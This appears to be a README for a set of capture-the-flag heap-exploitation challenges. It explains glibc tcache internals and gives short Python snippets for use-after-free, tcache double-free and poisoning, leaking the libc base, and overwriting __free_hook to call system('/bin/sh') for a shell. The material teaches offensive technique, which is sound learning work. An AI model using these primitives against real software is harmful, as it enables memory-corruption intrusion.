# Heap Exploitation

Challenges that exploit dynamic memory management bugs. Each challenge introduces a different heap primitive — from buffer overflows into adjacent allocations through use-after-free and tcache poisoning to full libc leaks. The protections in play are the heap allocator's own mitigations (tcache key, tcache count) rather than stack-level defenses like canaries or NX.

## Challenges

| challenge | technique | key concept |
|---|---|---|
| [account-vault](account-vault/) | UAF → tcache chunk reuse | free User, allocate same-size Data → tcache returns freed chunk; write win to action field |
| [inventory_slot](inventory_slot/) | heap overflow → function pointer overwrite | read(note, 0xC0) into 64-byte note; adjacent Slot->display at offset +80 |
| [recycler](recycler/) | tcache double-free + UAF | clear tcache key via UAF write → double free; overlapping allocs expose shared chunk |
| [notebook](notebook/) | tcache poisoning → arbitrary write | poison freed HEAD fd → &global_handler; next alloc writes win there |
| [whisper](whisper/) | unsorted bin libc leak + tcache poisoning | free large chunk → UAF leaks libc fd; tcache poison → __free_hook = system; free("/bin/sh") |

## Key Concepts

**Tcache (glibc ≥ 2.26):**
- Per-thread singly linked free list, one bin per size class (16–1032 bytes in 16-byte steps)
- At most 7 chunks cached per bin; next `malloc` of that size pops from the cache
- `tcache_entry.next` — forward link to the next free chunk (the fd pointer)
- `tcache_entry.key` — points back to `tcache_perthread_struct`; glibc checks this on `free` to detect double frees

**UAF read/write (account-vault / recycler pattern):**
```python
free_item(0)              # chunk freed — pointer in items[] is NOT nulled (dangling)
edit(0, p64(WIN))         # write through the dangling pointer → corrupts action field
invoke(1)                 # slot[1] aliases the same chunk → calls win()
```

**Tcache double-free (bypassing the key check):**
```python
free_item(0)                       # chunk A → tcache; key written at A[0x8]
edit(0, p64(0) + p64(0))           # UAF write: zero fd and key → check bypassed
free_item(0)                       # accepted; A appears twice in the tcache bin
create(1)                          # pops A (first copy)
create(2)                          # pops A again → slots[1] and slots[2] alias the same memory
```

**Tcache poisoning (notebook pattern):**
```python
# tcache bin after two frees: HEAD → B → A
edit(1, p64(TARGET))      # UAF write through dangling notes[1] = B: B->fd = TARGET
create(2)                 # pops B; tcache head now points to TARGET
create(3, payload)        # malloc returns TARGET as a usable pointer; payload written there
```
`TARGET` can be any writable address — a global function pointer, a GOT entry, `__free_hook`.

**Unsorted bin libc leak (whisper pattern):**
```python
create(0, 0x500)          # chunk > 0x410 bytes → goes to unsorted bin on free, not tcache
create(1, 0x20)           # guard chunk: prevents chunk 0 from coalescing with the top chunk
delete(0)                 # chunk 0 enters unsorted bin; fd = bk = &main_arena.bins[0]
leak = show(0)            # UAF read: first 8 bytes of freed chunk are the libc fd pointer
libc.address = leak - libc.sym.__malloc_hook - 0x70
```

**`__free_hook` overwrite (whisper pattern):**
```python
# tcache poisoning has placed __free_hook as the next allocation target
create(N, PSIZ, p64(libc.sym.system))  # malloc returns __free_hook; write system there
create(M, 0x20, b'/bin/sh\x00')        # note whose content is the shell string
delete(M)                              # free(ptr) → __free_hook(ptr) → system(ptr) → shell
```

**Clearing the tcache key before a double free:**
```
The key field is at offset 8 inside the freed chunk (right after fd).
Zero both fd (offset 0) and key (offset 8) via a UAF write before the second free.
```

**Libc base from unsorted bin fd:**
```python
# the constant offset depends on the libc version; measure it once locally:
# gdb: p (void*)main_arena.bins[0] - (void*)&libc  →  gives the fixed delta
libc.address = leak - libc.sym.__malloc_hook - 0x70   # typical Ubuntu 20.04 / glibc 2.31
```
